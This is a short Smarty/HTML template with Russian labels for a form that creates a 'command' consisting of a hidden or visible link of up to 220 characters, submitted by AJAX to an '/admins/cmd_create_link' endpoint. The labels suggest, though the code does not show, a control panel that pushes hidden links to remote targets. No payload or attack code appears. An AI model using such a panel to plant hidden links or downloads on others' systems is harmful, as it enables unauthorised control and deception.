<form action="/admins/cmd_create_link.html?window=1&amp;id={$admin->id}" enctype="application/x-www-form-urlencoded" method="post" name="add_sub{$rand_name}" id="add_sub{$rand_name}" onsubmit="submit_{$rand_name}(); return false;">
{if $smarty.post.submit eq ''}
<table cellspacing="1" cellpadding="0" class="t" style="width:100%">
<tr class="bg1">
		<td style="width:30%">Видимость:</td>
		<td style="width:70%">
        <select name="dev" class="i1" onFocus="this.id = 'i1'" onBlur="this.id = ''" style="width: 100%">
        <option value="1" selected="selected">Скрытая ссылка</option>
        <option value="0">Видимая ссылка (Не скрытая)</option>
        </select>
        </td>
</tr>
<tr class="bg2"><td colspan="2">&nbsp;</td></tr>
<tr class="bg1">
		<td style="width:30%">Ссылка: <font style="font-size: 9px;">(максимально 220 символов)</font></td>		<td style="width:70%; vertical-align: middle"><input name="link" type="text" class="i1" onFocus="this.id = 'i1'" onBlur="this.id = ''" style="width: 99%;" maxlength="220"></td>
</tr>
<tr class="bg2"><td colspan="2">&nbsp;</td></tr>
</table>
<input type="hidden" name="submit" value="1">
<div class=t>
<input class=i4 type="button" name="submit" value="Готово" style="width:100%;" onclick="submit_{$rand_name}();">
</div>
{else}
<div align="center">Пыпытка добавить ссылку, завершена.</div>
<script language="javascript" type="application/javascript">
window_close_opacity(document.forms['add_sub{$rand_name}'].parentNode.id.replace('_content', '_wid'), 1);
</script>
{/if}
</form>

<script language="javascript" type="application/javascript">
var id_{$rand_name} = document.forms['add_sub{$rand_name}'].parentNode.id.replace('_content', '');
document.getElementById(id_{$rand_name} + '_title').innerHTML = 'Создание команды - {$admin->link}';

function submit_{$rand_name}(){ldelim}
hax(document.forms['add_sub{$rand_name}'].action,
	{ldelim}
		method: document.forms['add_sub{$rand_name}'].method,
		form: 'add_sub{$rand_name}',
		id: id_{$rand_name} + '_content',
		nohistory:true,
		nocache:true,
		destroy:true,
		rc:true
	{rdelim}
);
document.getElementById(id_{$rand_name} + '_content').innerHTML = '<br /><div align="center"><img src="/images/indicator.gif" title="Загрузка" alt="Загрузка" /></div>';
{rdelim}
</script>